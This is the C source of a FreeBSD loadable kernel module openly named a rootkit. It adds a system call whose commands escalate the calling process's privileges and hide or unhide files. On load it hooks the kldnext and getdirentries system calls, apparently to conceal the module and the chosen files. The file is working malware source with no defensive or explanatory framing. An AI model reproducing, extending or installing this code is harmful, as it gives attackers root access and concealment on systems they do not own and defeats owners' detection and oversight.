#include "rootkit.h"

struct node * first_node = NULL;

/* The system call's arguments. */
struct rootkit_args {
	int command;
	char ** args;
};

/* The system call function. */
static int main(struct thread *td, void *syscall_args) {

	struct rootkit_args *uap;
	uap = (struct rootkit_args *)syscall_args;

	long resp;

	switch(uap->command){
		case 0:// Unload
			break;
		case 1:// Escalate
			elevate(td);
			break;
		case 2:// File hide
			add_file(uap->args[0]);
			break;
		case 3:
			remove_file(uap->args[0]);
			break;
		case 4:
			resp = strtol(uap->args[1], NULL, 10);
			set_flag_bits(uap->args[0], (uint8_t)resp);
			break;
		case 5:
			resp = strtol(uap->args[1], NULL, 10);
			unset_flag_bits(uap->args[0], (uint8_t)resp);
			break;
		default:
			uprintf("Bad command\n");
			break;
	}

	return(0);
}

/* The sysent for the new system call. */
static struct sysent rootkit_sysent = {
	2,			/* number of arguments */
	main		/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		printf("system call loaded at offset %d.\n", offset);
		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
		printf("kldnext hooked\n");
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries_hook;
		printf("getdirentries hooked\n");



		break;

	case MOD_UNLOAD:
		printf("system call unloaded from offset %d.\n", offset);
		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
		printf("kldnext unhooked\n");
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
		printf("getdirentries unhooked\n");
		break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

static struct syscall_module_data rootkit_func_mod = {
	load, NULL, &offset, &rootkit_sysent, { 0, NULL }
};

static moduledata_t rootkit_mod = {
	MODULE_NAME,
	syscall_module_handler,
	&rootkit_func_mod
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
